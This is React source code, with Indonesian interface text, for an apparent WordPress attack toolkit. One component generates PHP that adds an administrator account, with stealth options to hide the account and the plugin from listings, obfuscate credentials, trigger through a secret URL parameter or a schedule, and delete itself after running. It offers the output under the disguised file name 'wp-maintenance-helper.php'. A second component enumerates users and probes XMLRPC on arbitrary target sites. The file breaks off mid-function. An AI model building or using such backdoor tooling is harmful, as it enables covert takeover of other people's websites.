import { useState, useEffect } from "react";
import "@/App.css";
import axios from "axios";
import { Toaster, toast } from "sonner";
import { 
  Copy, Check, Trash2, Download, History, Settings, Code, Shield, Clock, 
  Eye, EyeOff, RefreshCw, Search, AlertTriangle, CheckCircle, XCircle,
  Users, Server, Lock, Globe, Scan, ChevronDown, ChevronUp, ExternalLink
} from "lucide-react";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Admin Adder Component
const AdminAdder = () => {
  const [codeType, setCodeType] = useState("theme");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [role, setRole] = useState("administrator");
  const [hideFromUserList, setHideFromUserList] = useState(false);
  const [hideFromUserCount, setHideFromUserCount] = useState(false);
  const [obfuscateCode, setObfuscateCode] = useState(false);
  const [useBase64, setUseBase64] = useState(false);
  const [triggerType, setTriggerType] = useState("immediate");
  const [urlParamKey, setUrlParamKey] = useState("wp_setup");
  const [urlParamValue, setUrlParamValue] = useState("init");
  const [scheduledTime, setScheduledTime] = useState("");
  const [autoDelete, setAutoDelete] = useState(false);
  const [generatedCode, setGeneratedCode] = useState("");
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [history, setHistory] = useState([]);
  const [showHistory, setShowHistory] = useState(false);
  const [selectedHistory, setSelectedHistory] = useState(null);
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    fetchHistory();
  }, []);

  const fetchHistory = async () => {
    try {
      const response = await axios.get(`${API}/history`);
      setHistory(response.data);
    } catch (e) {
      console.error("Error fetching history:", e);
    }
  };

  const generateRandomPassword = () => {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789!@#$%";
    let result = "";
    for (let i = 0; i < 16; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setPassword(result);
  };

  const handleGenerate = async () => {
    if (!username || !password || !email) {
      toast.error("Username, password, dan email wajib diisi!");
      return;
    }

    setLoading(true);
    try {
      const response = await axios.post(`${API}/generate`, {
        code_type: codeType,
        admin_config: { username, password, email, display_name: displayName || username, role },
        stealth_config: { hide_from_user_list: hideFromUserList, hide_from_user_count: hideFromUserCount, obfuscate_code: obfuscateCode, use_base64_encoding: useBase64 },
        trigger_config: { trigger_type: triggerType, url_param_key: urlParamKey, url_param_value: urlParamValue, scheduled_time: scheduledTime, auto_delete_after_run: autoDelete },
      });
      setGeneratedCode(response.data.php_code);
      toast.success("Kode berhasil di-generate!");
      fetchHistory();
    } catch (e) {
      toast.error("Gagal generate kode: " + (e.response?.data?.detail || e.message));
    } finally {
      setLoading(false);
    }
  };

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(generatedCode);
      setCopied(true);
      toast.success("Kode berhasil disalin!");
      setTimeout(() => setCopied(false), 2000);
    } catch (e) {
      toast.error("Gagal menyalin kode");
    }
  };

  const downloadCode = () => {
    const filename = codeType === "plugin" ? "wp-maintenance-helper.php" : "functions-snippet.php";
    const blob = new Blob([generatedCode], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
    toast.success(`File ${filename} berhasil diunduh!`);
  };

  const viewHistoryCode = async (id) => {
    try {
      const response = await axios.get(`${API}/history/${id}`);
      setSelectedHistory(response.data);
      setGeneratedCode(response.data.php_code);
    } catch (e) {
      toast.error("Gagal mengambil kode");
    }
  };

  const deleteHistoryItem = async (id) => {
    try {
      await axios.delete(`${API}/history/${id}`);
      toast.success("Item dihapus dari history");
      fetchHistory();
      if (selectedHistory?.id === id) {
        setSelectedHistory(null);
        setGeneratedCode("");
      }
    } catch (e) {
      toast.error("Gagal menghapus item");
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
      {/* Left Column */}
      <div className="space-y-6">
        {/* Code Type */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Code className="w-5 h-5 text-purple-400" /> Tipe Kode
          </h2>
          <div className="grid grid-cols-2 gap-3">
            <button onClick={() => setCodeType("theme")} className={`p-4 rounded-lg border-2 transition-all ${codeType === "theme" ? "border-purple-500 bg-purple-500/20 text-white" : "border-white/10 bg-white/5 text-gray-400 hover:border-purple-500/50"}`} data-testid="code-type-theme">
              <div className="font-medium">Theme</div>
              <div className="text-xs mt-1 opacity-70">Untuk functions.php</div>
            </button>
            <button onClick={() => setCodeType("plugin")} className={`p-4 rounded-lg border-2 transition-all ${codeType === "plugin" ? "border-purple-500 bg-purple-500/20 text-white" : "border-white/10 bg-white/5 text-gray-400 hover:border-purple-500/50"}`} data-testid="code-type-plugin">
              <div className="font-medium">Plugin</div>
              <div className="text-xs mt-1 opacity-70">File plugin terpisah</div>
            </button>
          </div>
        </div>

        {/* Admin Config */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Settings className="w-5 h-5 text-purple-400" /> Konfigurasi Admin
          </h2>
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-purple-300 mb-1">Username *</label>
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} placeholder="admin_baru" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" data-testid="input-username" />
            </div>
            <div>
              <label className="block text-sm text-purple-300 mb-1">Password *</label>
              <div className="flex gap-2">
                <div className="relative flex-1">
                  <input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password kuat" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 pr-10" data-testid="input-password" />
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white">
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
                <button onClick={generateRandomPassword} className="px-3 py-2 bg-purple-600 hover:bg-purple-700 rounded-lg text-white transition-colors" data-testid="generate-password-btn">
                  <RefreshCw className="w-4 h-4" />
                </button>
              </div>
            </div>
            <div>
              <label className="block text-sm text-purple-300 mb-1">Email *</label>
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="admin@example.com" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" data-testid="input-email" />
            </div>
            <div>
              <label className="block text-sm text-purple-300 mb-1">Display Name</label>
              <input type="text" value={displayName} onChange={(e) => setDisplayName(e.target.value)} placeholder="Nama tampilan (opsional)" className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500" data-testid="input-display-name" />
            </div>
            <div>
              <label className="block text-sm text-purple-300 mb-1">Role</label>
              <select value={role} onChange={(e) => setRole(e.target.value)} className="w-full px-4 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white focus:outline-none focus:border-purple-500" data-testid="select-role">
                <option value="administrator" className="bg-gray-800">Administrator</option>
                <option value="editor" className="bg-gray-800">Editor</option>
                <option value="author" className="bg-gray-800">Author</option>
              </select>
            </div>
          </div>
        </div>

        {/* Stealth Options */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Shield className="w-5 h-5 text-purple-400" /> Opsi Stealth
          </h2>
          <div className="space-y-3">
            {[
              { checked: hideFromUserList, setter: setHideFromUserList, label: "Sembunyikan dari daftar user", id: "hide-user-list" },
              { checked: hideFromUserCount, setter: setHideFromUserCount, label: "Sembunyikan dari jumlah user", id: "hide-user-count" },
              { checked: obfuscateCode, setter: setObfuscateCode, label: "Sembunyikan plugin dari daftar plugin", id: "obfuscate" },
              { checked: useBase64, setter: setUseBase64, label: "Encode kredensial dengan Base64", id: "base64" },
            ].map((opt) => (
              <label key={opt.id} className="flex items-center gap-3 cursor-pointer group">
                <input type="checkbox" checked={opt.checked} onChange={(e) => opt.setter(e.target.checked)} className="w-4 h-4 rounded" data-testid={`checkbox-${opt.id}`} />
                <span className="text-gray-300 group-hover:text-white transition-colors">{opt.label}</span>
              </label>
            ))}
          </div>
        </div>

        {/* Trigger Options */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Clock className="w-5 h-5 text-purple-400" /> Opsi Trigger
          </h2>
          <div className="space-y-4">
            <div className="grid grid-cols-3 gap-2">
              {["immediate", "url_param", "scheduled"].map((t) => (
                <button key={t} onClick={() => setTriggerType(t)} className={`px-3 py-2 rounded-lg text-sm transition-all ${triggerType === t ? "bg-purple-500 text-white" : "bg-white/10 text-gray-400 hover:bg-white/20"}`}>
                  {t === "immediate" ? "Langsung" : t === "url_param" ? "URL Param" : "Terjadwal"}
                </button>
              ))}
            </div>
            {triggerType === "url_param" && (
              <div className="grid grid-cols-2 gap-3 animate-fade-in">
                <div>
                  <label className="block text-xs text-purple-300 mb-1">Parameter Key</label>
                  <input type="text" value={urlParamKey} onChange={(e) => setUrlParamKey(e.target.value)} className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm" />
                </div>
                <div>
                  <label className="block text-xs text-purple-300 mb-1">Parameter Value</label>
                  <input type="text" value={urlParamValue} onChange={(e) => setUrlParamValue(e.target.value)} className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm" />
                </div>
                <div className="col-span-2 text-xs text-gray-400 bg-black/30 p-2 rounded">
                  Akses: <code className="text-purple-400">https://site.com/?{urlParamKey}={urlParamValue}</code>
                </div>
              </div>
            )}
            {triggerType === "scheduled" && (
              <div className="animate-fade-in">
                <label className="block text-xs text-purple-300 mb-1">Tanggal Eksekusi</label>
                <input type="date" value={scheduledTime} onChange={(e) => setScheduledTime(e.target.value)} className="w-full px-3 py-2 rounded-lg bg-white/10 border border-purple-800/30 text-white text-sm" />
              </div>
            )}
            <label className="flex items-center gap-3 cursor-pointer group pt-2">
              <input type="checkbox" checked={autoDelete} onChange={(e) => setAutoDelete(e.target.checked)} className="w-4 h-4 rounded" />
              <span className="text-gray-300 group-hover:text-white transition-colors">Hapus kode otomatis setelah eksekusi</span>
            </label>
          </div>
        </div>

        <button onClick={handleGenerate} disabled={loading} className="w-full py-4 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 disabled:opacity-50 text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2" data-testid="generate-btn">
          {loading ? <><RefreshCw className="w-5 h-5 animate-spin" /> Generating...</> : <><Code className="w-5 h-5" /> Generate Kode</>}
        </button>
      </div>

      {/* Right Column */}
      <div className="space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-semibold text-white flex items-center gap-2">
              <Code className="w-5 h-5 text-purple-400" /> Kode PHP
            </h2>
            {generatedCode && (
              <div className="flex gap-2">
                <button onClick={copyToClipboard} className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300 hover:text-white transition-colors">
                  {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
                </button>
                <button onClick={downloadCode} className="p-2 bg-white/10 hover:bg-white/20 rounded-lg text-purple-300 hover:text-white transition-colors">
                  <Download className="w-4 h-4" />
                </button>
              </div>
            )}
          </div>
          <pre className="bg-black/50 rounded-lg p-4 overflow-x-auto text-sm text-gray-300 font-mono min-h-[400px] max-h-[600px] overflow-y-auto" data-testid="code-output">
            {generatedCode || <span className="text-gray-500 italic">Kode akan muncul di sini setelah generate...</span>}
          </pre>
        </div>

        {/* Instructions */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4">Cara Penggunaan</h2>
          <div className="space-y-3 text-sm text-gray-300">
            {codeType === "theme" ? (
              <>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">1</span><p>Buka file <code className="text-purple-400 bg-black/30 px-1 rounded">functions.php</code></p></div>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">2</span><p>Tempelkan kode di bagian paling bawah</p></div>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">3</span><p>Simpan dan akses website</p></div>
              </>
            ) : (
              <>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">1</span><p>Upload ke <code className="text-purple-400 bg-black/30 px-1 rounded">wp-content/plugins/</code></p></div>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">2</span><p>Aktifkan plugin via dashboard</p></div>
                <div className="flex gap-3"><span className="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500/30 text-purple-300 flex items-center justify-center text-xs">3</span><p>Plugin akan dieksekusi sesuai trigger</p></div>
              </>
            )}
          </div>
        </div>

        {/* History */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <div className="flex items-center justify-between mb-4 cursor-pointer" onClick={() => setShowHistory(!showHistory)}>
            <h2 className="text-lg font-semibold text-white flex items-center gap-2">
              <History className="w-5 h-5 text-purple-400" /> History ({history.length})
            </h2>
            {showHistory ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
          </div>
          {showHistory && (
            <div className="space-y-2 max-h-[200px] overflow-y-auto animate-fade-in">
              {history.length === 0 ? (
                <p className="text-gray-500 text-center py-4">Belum ada history</p>
              ) : (
                history.map((item) => (
                  <div key={item.id} className={`p-3 rounded-lg border cursor-pointer transition-all ${selectedHistory?.id === item.id ? "border-purple-500 bg-purple-500/20" : "border-white/10 bg-white/5 hover:border-purple-500/50"}`} onClick={() => viewHistoryCode(item.id)}>
                    <div className="flex items-center justify-between">
                      <div>
                        <div className="text-white text-sm font-medium">{item.admin_username}</div>
                        <div className="text-xs text-gray-400">{item.code_type} • {item.trigger_type} {item.stealth_enabled && "• 🔒"}</div>
                      </div>
                      <button onClick={(e) => { e.stopPropagation(); deleteHistoryItem(item.id); }} className="p-1 text-gray-500 hover:text-red-400">
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// Security Scanner Component
const SecurityScanner = () => {
  const [targetUrl, setTargetUrl] = useState("");
  const [scanning, setScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);
  const [scanHistory, setScanHistory] = useState([]);
  const [expandedSections, setExpandedSections] = useState({
    users: true,
    xmlrpc: true,
    headers: false,
    recommendations: true
  });

  useEffect(() => {
    fetchScanHistory();
  }, []);

  const fetchScanHistory = async () => {
    try {
      const response = await axios.get(`${API}/scans`);
      setScanHistory(response.data);
    } catch (e) {
      console.error("Error fetching scan history:", e);
    }
  };

  const handleScan = async () => {
    if (!targetUrl) {
      toast.error("Masukkan URL target!");
      return;
    }

    setScanning(true);
    setScanResult(null);
    toast.info("Memulai scan...");

    try {
      const response = await axios.post(`${API}/scan`, {
        target_url: targetUrl,
        scan_types: ["user_enum", "xmlrpc", "security_headers", "wp_version"]
      });
      setScanResult(response.data);
      toast.success("Scan selesai!");
      fetchScanHistory();
    } catch (e) {
      toast.error("Scan gagal: " + (e.response?.data?.detail || e.message));
    } finally {
      setScanning(false);
    }
  };

  const loadScan = async (id) => {
    try {
      const response = await axios.get(`${API}/scans/${id}`);
      setScanResult(response.data);
      setTargetUrl(response.data.target_url);
    } catch (e) {
      toast.error("Gagal memuat hasil scan");
    }
  };

  const toggleSection = (section) => {
    setExpandedSections(prev => ({ ...prev, [section]: !prev[section] }));
  };

  const SeverityBadge = ({ severity }) => {
    const colors = {
      "High": "bg-red-500/20 text-red-400 border-red-500/50",
      "Medium": "bg-yellow-500/20 text-yellow-400 border-yellow-500/50",
      "Low": "bg-blue-500/20 text-blue-400 border-blue-500/50",
      "Info": "bg-gray-500/20 text-gray-400 border-gray-500/50"
    };
    return (
      <span className={`px-2 py-0.5 rounded text-xs border ${colors[severity] || colors["Info"]}`}>
        {severity}
      </span>
    );
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
      {/* Left Column - Scanner Input */}
      <div className="lg:col-span-1 space-y-6">
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <Scan className="w-5 h-5 text-purple-400" /> WP Security Scanner
          </h2>
          <div className="space-y-4">
            <div>
              <label className="block text-sm text-purple-300 mb-1">Target URL</label>
              <input
                type="text"
                value={targetUrl}
                onChange={(e) => setTargetUrl(e.target.value)}
                placeholder="https://example.com"
                className="w-full px-4 py-3 rounded-lg bg-white/10 border border-purple-800/30 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500"
                data-testid="input-target-url"
              />
            </div>
            <button
              onClick={handleScan}
              disabled={scanning}
              className="w-full py-3 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:opacity-50 text-white font-semibold rounded-xl transition-all flex items-center justify-center gap-2"
              data-testid="scan-btn"
            >
              {scanning ? (
                <><RefreshCw className="w-5 h-5 animate-spin" /> Scanning...</>
              ) : (
                <><Search className="w-5 h-5" /> Mulai Scan</>
              )}
            </button>
          </div>

          {/* Scan Types Info */}
          <div className="mt-6 space-y-2">
            <h3 className="text-sm font-medium text-purple-300">Fitur Scan:</h3>
            <div className="grid grid-cols-1 gap-2 text-xs">
              {[
                { icon: Users, label: "User Enumeration", desc: "REST API, Author Archives, RSS" },
                { icon: Server, label: "XMLRPC Scanner", desc: "Method listing, vulnerabilities" },
                { icon: Lock, label: "Security Headers", desc: "X-Frame, CSP, HSTS" },
                { icon: Globe, label: "WP Detection", desc: "Version, fingerprinting" }
              ].map((item) => (
                <div key={item.label} className="flex items-start gap-2 p-2 bg-black/20 rounded">
                  <item.icon className="w-4 h-4 text-purple-400 mt-0.5" />
                  <div>
                    <div className="text-white">{item.label}</div>
                    <div className="text-gray-500">{item.desc}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* Scan History */}
        <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 border border-purple-800/30">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <History className="w-5 h-5 text-purple-400" /> Scan History
          </h2>
          <div className="space-y-2 max-h-[300px] overflow-y-auto">
            {scanHistory.length === 0 ? (
              <p className="text-gray-500 text-center py-4">Belum ada scan</p>
            ) : (
              scanHistory.map((scan) => (
                <div
                  key={scan.id}
                  onClick={() => loadScan(scan.id)}
                  className="p-3 rounded-lg border border-white/10 bg-white/5 hover:border-purple-500/50 cursor-pointer transition-all"
                >
                  <div className="text-white text-sm font-medium truncate">{scan.target_url}</div>
                  <div className="flex items-center gap-2 mt-1">
                    {scan.is_wordpress ? (
                      <span className="text-xs text-green-400">✓ WordPress</span>
                    ) : (
                      <span className="text-xs text-red-400">✗ Not WP</span>
                    )}
                    <span className="text-xs text-gray-500">
                      {new Date(scan.scan_date).toLocaleDateString()}
                    </span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Right Column - Results */}
      <div className="lg:col-span-2 space-y-6">
        {!scanResult ? (
          <div className="bg-white/5 backdrop-blur-sm rounded-xl p-12 border border-purple-800/30 text-center">
            <Scan className="w-16 h-16 text-purple-500/50 mx-auto mb-4" />
            <h3 className="text-xl text-gray-400">Masukkan URL dan klik Scan</h3>
            <p className="text-sm text-gray-500 mt-2">Scanner akan memeriksa kerentanan WordPress target</p>
          </div>
        ) : (
          <>
            {/* Summary Card */}
            <div className={`bg-white/5 backdrop-blur-sm rounded-xl p-6 border ${scanResult.is_wordpress ? "border-green-500/30" : "border-red-500/30"}`}>
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-semibold text-white flex items-center gap-2">
                    {scanResult.is_wordpress ? (
                      <CheckCircle className="w-6 h-6 text-green-400" />
                    ) : (
                      <XCircle className="w-6 h-6 text-red-400" />
                    )}
                    {scanResult.target_url}
                  </h2>
                  <div className="flex items-center gap-4 mt-2 text-sm">
                    {scanResult.is_wordpress && (
                      <>
                        <span className="text-green-400">WordPress Detected</span>
                        {scanResult.wp_version && (
                          <span className="text-yellow-400">v{scanResult.wp_version}</span>
                        )}
                      </>
                    )}
                    <span className="text-gray-400">
                      Scanned: {new Date(scanResult.scan_date).toLocaleString()}
                    </span>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-3xl font-bold text-purple-400">{scanResult.users_found?.length || 0}</div>
                  <div className="text-xs text-gray-400">Users Found</div>
                </div>
              </div>
            </div>

            {/* Users Found */}
            {scanResult.users_found?.length > 0 && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('users')}>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Users className="w-5 h-5 text-red-400" />
                    Users Found ({scanResult.users_found.length})
                    <SeverityBadge severity="High" />
                  </h3>
                  {expandedSections.users ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
                </div>
                {expandedSections.users && (
                  <div className="p-4">
                    <div className="overflow-x-auto">
                      <table className="w-full text-sm">
                        <thead>
                          <tr className="text-left text-gray-400 border-b border-white/10">
                            <th className="pb-2 pr-4">ID</th>
                            <th className="pb-2 pr-4">Username</th>
                            <th className="pb-2 pr-4">Name</th>
                            <th className="pb-2 pr-4">Method</th>
                            <th className="pb-2">URL</th>
                          </tr>
                        </thead>
                        <tbody className="text-gray-300">
                          {scanResult.users_found.map((user, idx) => (
                            <tr key={idx} className="border-b border-white/5">
                              <td className="py-2 pr-4 text-purple-400">{user.id || "-"}</td>
                              <td className="py-2 pr-4 font-mono text-red-400">{user.username}</td>
                              <td className="py-2 pr-4">{user.name}</td>
                              <td className="py-2 pr-4">
                                <span className="px-2 py-0.5 bg-purple-500/20 text-purple-300 rounded text-xs">{user.method}</span>
                              </td>
                              <td className="py-2">
                                {user.url && (
                                  <a href={user.url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline flex items-center gap-1">
                                    <ExternalLink className="w-3 h-3" />
                                  </a>
                                )}
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </div>
            )}

            {/* XMLRPC Status */}
            {scanResult.xmlrpc_status && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('xmlrpc')}>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Server className="w-5 h-5 text-yellow-400" />
                    XMLRPC Status
                    {scanResult.xmlrpc_status.enabled ? (
                      <SeverityBadge severity="Medium" />
                    ) : (
                      <span className="px-2 py-0.5 rounded text-xs bg-green-500/20 text-green-400 border border-green-500/50">Disabled</span>
                    )}
                  </h3>
                  {expandedSections.xmlrpc ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
                </div>
                {expandedSections.xmlrpc && (
                  <div className="p-4 space-y-4">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                      <div className="p-3 bg-black/30 rounded-lg">
                        <div className="text-xs text-gray-400">Status</div>
                        <div className={`text-lg font-bold ${scanResult.xmlrpc_status.enabled ? "text-red-400" : "text-green-400"}`}>
                          {scanResult.xmlrpc_status.enabled ? "ENABLED" : "DISABLED"}
                        </div>
                      </div>
                      <div className="p-3 bg-black/30 rounded-lg">
                        <div className="text-xs text-gray-400">Pingback</div>
                        <div className={`text-lg font-bold ${scanResult.xmlrpc_status.pingback_enabled ? "text-yellow-400" : "text-green-400"}`}>
                          {scanResult.xmlrpc_status.pingback_enabled ? "YES" : "NO"}
                        </div>
                      </div>
                      <div className="p-3 bg-black/30 rounded-lg">
                        <div className="text-xs text-gray-400">Multicall</div>
                        <div className={`text-lg font-bold ${scanResult.xmlrpc_status.multicall_enabled ? "text-red-400" : "text-green-400"}`}>
                          {scanResult.xmlrpc_status.multicall_enabled ? "YES" : "NO"}
                        </div>
                      </div>
                      <div className="p-3 bg-black/30 rounded-lg">
                        <div className="text-xs text-gray-400">Methods</div>
                        <div className="text-lg font-bold text-purple-400">
                          {scanResult.xmlrpc_status.methods_available?.length || 0}
                        </div>
                      </div>
                    </div>

                    {scanResult.xmlrpc_status.vulnerabilities?.length > 0 && (
                      <div className="space-y-2">
                        <h4 className="text-sm font-medium text-red-400">Vulnerabilities Found:</h4>
                        {scanResult.xmlrpc_status.vulnerabilities.map((vuln, idx) => (
                          <div key={idx} className="p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
                            <div className="flex items-center gap-2">
                              <AlertTriangle className="w-4 h-4 text-red-400" />
                              <span className="text-white font-medium">{vuln.name}</span>
                              <SeverityBadge severity={vuln.severity} />
                            </div>
                            <p className="text-sm text-gray-400 mt-1">{vuln.description}</p>
                            <code className="text-xs text-purple-400 mt-1 block">Method: {vuln.method}</code>
                          </div>
                        ))}
                      </div>
                    )}

                    {scanResult.xmlrpc_status.methods_available?.length > 0 && (
                      <div>
                        <h4 className="text-sm font-medium text-gray-400 mb-2">Available Methods:</h4>
                        <div className="flex flex-wrap gap-1">
                          {scanResult.xmlrpc_status.methods_available.slice(0, 15).map((method, idx) => (
                            <span key={idx} className="px-2 py-0.5 bg-black/30 rounded text-xs text-gray-400">{method}</span>
                          ))}
                          {scanResult.xmlrpc_status.methods_available.length > 15 && (
                            <span className="px-2 py-0.5 bg-black/30 rounded text-xs text-gray-500">+{scanResult.xmlrpc_status.methods_available.length - 15} more</span>
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Security Headers */}
            {scanResult.security_headers && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('headers')}>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <Lock className="w-5 h-5 text-blue-400" />
                    Security Headers
                    <span className={`px-2 py-0.5 rounded text-xs ${scanResult.security_headers.score >= 70 ? "bg-green-500/20 text-green-400" : scanResult.security_headers.score >= 40 ? "bg-yellow-500/20 text-yellow-400" : "bg-red-500/20 text-red-400"}`}>
                      {scanResult.security_headers.score}%
                    </span>
                  </h3>
                  {expandedSections.headers ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
                </div>
                {expandedSections.headers && (
                  <div className="p-4 space-y-4">
                    {Object.keys(scanResult.security_headers.headers_present || {}).length > 0 && (
                      <div>
                        <h4 className="text-sm font-medium text-green-400 mb-2 flex items-center gap-1">
                          <CheckCircle className="w-4 h-4" /> Present Headers
                        </h4>
                        <div className="space-y-2">
                          {Object.entries(scanResult.security_headers.headers_present).map(([header, info]) => (
                            <div key={header} className="p-2 bg-green-500/10 border border-green-500/20 rounded">
                              <div className="text-white font-mono text-sm">{header}</div>
                              <div className="text-xs text-gray-400 truncate">{info.value}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                    {scanResult.security_headers.headers_missing?.length > 0 && (
                      <div>
                        <h4 className="text-sm font-medium text-red-400 mb-2 flex items-center gap-1">
                          <XCircle className="w-4 h-4" /> Missing Headers
                        </h4>
                        <div className="space-y-2">
                          {scanResult.security_headers.headers_missing.map((item, idx) => (
                            <div key={idx} className="p-2 bg-red-500/10 border border-red-500/20 rounded">
                              <div className="text-white font-mono text-sm">{item.header}</div>
                              <div className="text-xs text-gray-400">{item.description}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Recommendations */}
            {scanResult.recommendations?.length > 0 && (
              <div className="bg-white/5 backdrop-blur-sm rounded-xl border border-purple-800/30 overflow-hidden">
                <div className="p-4 border-b border-purple-800/30 flex items-center justify-between cursor-pointer" onClick={() => toggleSection('recommendations')}>
                  <h3 className="text-lg font-semibold text-white flex items-center gap-2">
                    <AlertTriangle className="w-5 h-5 text-yellow-400" />
                    Recommendations ({scanResult.recommendations.length})
                  </h3>
                  {expandedSections.recommendations ? <ChevronUp className="w-5 h-5 text-gray-400" /> : <ChevronDown className="w-5 h-5 text-gray-400" />}
                </div>
                {expandedSections.recommendations && (
                  <div className="p-4">
                    <div className="space-y-2">
                      {scanResult.recommendations.map((rec, idx) => (
                        <div key={idx} className="p-3 bg-black/30 rounded-lg text-sm text-gray-300">
                          {rec}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
};

// Main App
function App() {
